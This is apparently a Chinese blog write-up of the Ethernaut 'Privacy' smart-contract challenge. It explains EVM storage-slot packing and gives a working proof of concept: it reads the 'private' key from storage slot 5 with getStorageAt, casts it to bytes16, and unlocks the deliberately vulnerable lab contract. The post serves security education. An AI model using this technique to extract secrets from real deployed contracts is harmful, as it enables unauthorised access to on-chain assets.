---
title: 'ethernaut.openzeppelin合约安全闯关-10'
date: 2022-12-11 20:42:15
tags:
- '区块链技术'
- '智能合约安全'
categories:
- '智能合约安全'


---

<!-- more -->

::: tip

目前来看最全面的智能合约安全靶场:+1:

https://ethernaut.openzeppelin.com/ 

浏览器控制台 help()指令

![help](./assets/1670479273112.png)

:::

#### 第十二关Privacy 思路与POC

#### 目标: 将locked变量设置为false

##### 先看代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {

/*
数据存储布局分析
！存储插槽不根据类型分配,只根据变量所占空间分配

 bool public locked = true; -> slot1没有位置所以独占32字节 = slot0
  uint256 public ID = block.timestamp; -> uint256占32字节 = slot1
  
  根据紧凑存储原则 以下三个相邻变量共享一个slot 
  uint8 private flattening = 10; -> 1字节 
  uint8 private denomination = 255; -> 1字节
  uint16 private awkwardness = uint16(block.timestamp); -> 2字节 
  -------------> slot2
  
  数组类型并且每个元素占32字节,连续存储
  bytes32[3] private data; -> data[0] = slot3 ,data[1] = slot4 ,data[2] = slot5
*/
  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(block.timestamp);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }
}
```

##### poc思路:point_right:：虽然变量全部为private类型,而且密码还存在byte32数组中,但是呢如果对EVM的数据存储机制足够了解的话就能读取出byte32类型的密码

```js
//根据综上存储布局分析, 读取插槽5的数据    
await web3.eth.getStorageAt(
        "0x38Da8513ec46031966Db46718ef10E9fd6aa3Dd0",
        5,
        (err, res) => {
            console.log(res)
        }
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ByteConvert{
      
    bytes16 public  res16 ; 

    bytes32 public  res32 ; 
    //将byte32转换为byte16即是_key
    function byte32To16(bytes32 data) public{
        res16 =  bytes16(data);      
    }
     function byte16To32(bytes16 data) public{
        res32 =  bytes32(data);      
    }
}
```

##### 完成:tada:

```js
await contract.locked()
false
```

